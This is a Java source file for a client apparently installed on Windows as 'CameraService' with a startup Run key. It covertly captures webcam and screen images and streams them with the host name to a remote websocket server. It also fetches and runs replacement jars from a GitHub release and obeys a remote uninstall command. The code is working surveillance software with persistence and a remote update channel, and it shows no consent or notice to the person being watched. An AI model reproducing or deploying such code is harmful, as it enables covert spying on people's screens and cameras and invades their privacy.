import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.util.Base64;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import javax.imageio.ImageIO;

import org.bytedeco.javacv.Frame;
import org.bytedeco.javacv.Java2DFrameConverter;
import org.bytedeco.javacv.OpenCVFrameGrabber;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

public class CameraClient {

    static final String SERVER_URL    = "wss://pccon.onrender.com";
    static final int    CAM_FPS       = 30;
    static final int    SCREEN_FPS    = 10; // screen is heavier, keep lower
    static final int    RECONNECT_SEC = 5;

    // Self-update: upload new jar to GitHub Releases as "camera-client.jar"
    static final String UPDATE_URL = "https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar";
    static final String VERSION    = "1.0"; // bump this string each time you release

    static volatile CameraWebSocket ws;
    static volatile boolean reconnecting = false;
    static String pcId;
    static boolean hasCamera = false;
    static OpenCVFrameGrabber grabber;

    public static void main(String[] args) throws Exception {
        checkForUpdate();
        pcId = InetAddress.getLocalHost().getHostName();

        for (int idx = 0; idx < 3; idx++) {
            try {
                grabber = new OpenCVFrameGrabber(idx);
                grabber.setImageWidth(640);
                grabber.setImageHeight(480);
                grabber.start();
                Frame test = grabber.grab();
                if (test != null && test.image != null) {
                    hasCamera = true;
                    System.out.println("[*] Camera: true (index " + idx + ")");
                    break;
                }
                grabber.stop();
            } catch (Exception e) {
                System.out.println("[*] Camera index " + idx + " failed: " + e.getMessage());
            }
        }
        if (!hasCamera) System.out.println("[*] Camera: false");

        if (hasCamera) startCameraLoop();
        startScreenLoop();
        connectAndRun();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (ws != null) ws.close();
            if (grabber != null) try { grabber.stop(); } catch (Exception ignored) {}
        }));

        Thread.currentThread().join();
    }

    static void runUninstall() {
        System.out.println("[*] Uninstall command received.");
        try {
            String installDir = System.getenv("ProgramData") + "\\CameraService";
            // Remove startup registry entry
            new ProcessBuilder("reg", "delete",
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "CameraService", "/f").start().waitFor();
            // Delete install folder
            new ProcessBuilder("cmd", "/c", "rmdir /s /q \"" + installDir + "\"").start().waitFor();
            System.out.println("[*] Uninstalled.");
        } catch (Exception e) {
            System.err.println("[!] Uninstall error: " + e.getMessage());
        }
        System.exit(0);
    }

    static void checkForUpdate() {
        try {
            // Check version.txt in the release to compare
            URL versionUrl = new URL(UPDATE_URL.replace("camera-client.jar", "version.txt"));
            HttpURLConnection conn = (HttpURLConnection) versionUrl.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setInstanceFollowRedirects(true);
            if (conn.getResponseCode() != 200) return;
            String latest = new String(conn.getInputStream().readAllBytes()).trim();
            if (latest.equals(VERSION)) { System.out.println("[*] Up to date (v" + VERSION + ")"); return; }
            System.out.println("[*] Update available: v" + latest + " (current: v" + VERSION + ") — downloading...");

            // Download new jar next to current jar
            File self = new File(CameraClient.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            File newJar = new File(self.getParent(), "camera-client-update.jar");
            HttpURLConnection dl = (HttpURLConnection) new URL(UPDATE_URL).openConnection();
            dl.setInstanceFollowRedirects(true);
            try (InputStream in = dl.getInputStream(); FileOutputStream out = new FileOutputStream(newJar)) {
                in.transferTo(out);
            }
            System.out.println("[*] Downloaded update. Relaunching...");

            // Replace self and relaunch
            File backup = new File(self.getParent(), "camera-client-old.jar");
            self.renameTo(backup);
            newJar.renameTo(self);
            new ProcessBuilder("java", "--enable-native-access=ALL-UNNAMED", "-jar", self.getAbsolutePath())
                .inheritIO().start();
            System.exit(0);
        } catch (Exception e) {
            System.out.println("[*] Update check failed: " + e.getMessage());
        }
    }

    static void startCameraLoop() {
        long intervalMs = 1000L / CAM_FPS;
        Java2DFrameConverter converter = new Java2DFrameConverter();

        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            try {
                if (ws == null || !ws.isOpen()) return;
                Frame frame = grabber.grab();
                if (frame == null || frame.image == null) return;
                BufferedImage img = converter.convert(frame);
                if (img == null) return;
                String b64 = toBase64(img);
                if (b64 == null) return;
                ws.send("{\"type\":\"frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
            } catch (Exception e) {
                System.err.println("[!] Camera error: " + e.getMessage());
            }
        }, 0, intervalMs, TimeUnit.MILLISECONDS);
    }

    static void startScreenLoop() {
        Robot robot;
        try {
            robot = new Robot();
        } catch (AWTException e) {
            System.err.println("[!] Screen capture unavailable: " + e.getMessage());
            return;
        }
        Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        long intervalMs = 1000L / SCREEN_FPS;

        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            try {
                if (ws == null || !ws.isOpen()) return;
                BufferedImage img = robot.createScreenCapture(screen);
                // scale down to reduce bandwidth
                java.awt.image.BufferedImage scaled = new java.awt.image.BufferedImage(1280, 720, BufferedImage.TYPE_INT_RGB);
                scaled.getGraphics().drawImage(img.getScaledInstance(1280, 720, java.awt.Image.SCALE_FAST), 0, 0, null);
                String b64 = toBase64(scaled);
                if (b64 == null) return;
                ws.send("{\"type\":\"screen_frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
            } catch (Exception e) {
                System.err.println("[!] Screen error: " + e.getMessage());
            }
        }, 0, intervalMs, TimeUnit.MILLISECONDS);

        System.out.println("[*] Screen capture started");
    }

    static String toBase64(BufferedImage img) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(img, "jpg", baos);
            byte[] bytes = baos.toByteArray();
            return bytes.length == 0 ? null : Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) { return null; }
    }

    static void connectAndRun() {
        try {
            ws = new CameraWebSocket(new URI(SERVER_URL));
            ws.connectBlocking();
            if (!ws.isOpen()) { scheduleReconnect(); return; }
            System.out.println("[+] Connected.");
            ws.send("{\"type\":\"hello\",\"id\":\"" + pcId + "\",\"hasCamera\":" + hasCamera + ",\"hasScreen\":true}");
        } catch (Exception e) {
            System.err.println("[!] Connection error: " + e.getMessage());
            scheduleReconnect();
        }
    }

    static synchronized void scheduleReconnect() {
        if (reconnecting) return;
        reconnecting = true;
        System.out.println("[*] Reconnecting in " + RECONNECT_SEC + "s...");
        Executors.newSingleThreadScheduledExecutor().schedule(() -> {
            reconnecting = false;
            connectAndRun();
        }, RECONNECT_SEC, TimeUnit.SECONDS);
    }

    static class CameraWebSocket extends WebSocketClient {
        CameraWebSocket(URI uri) { super(uri); }
        @Override public void onOpen(ServerHandshake h) {}
        @Override public void onMessage(String msg) {
            if (msg.contains("\"uninstall\"")) runUninstall();
        }
        @Override public void onClose(int code, String reason, boolean remote) {
            System.out.println("[*] Disconnected: " + reason);
            scheduleReconnect();
        }
        @Override public void onError(Exception e) {
            System.err.println("[!] WS error: " + e.getMessage());
        }
    }
}
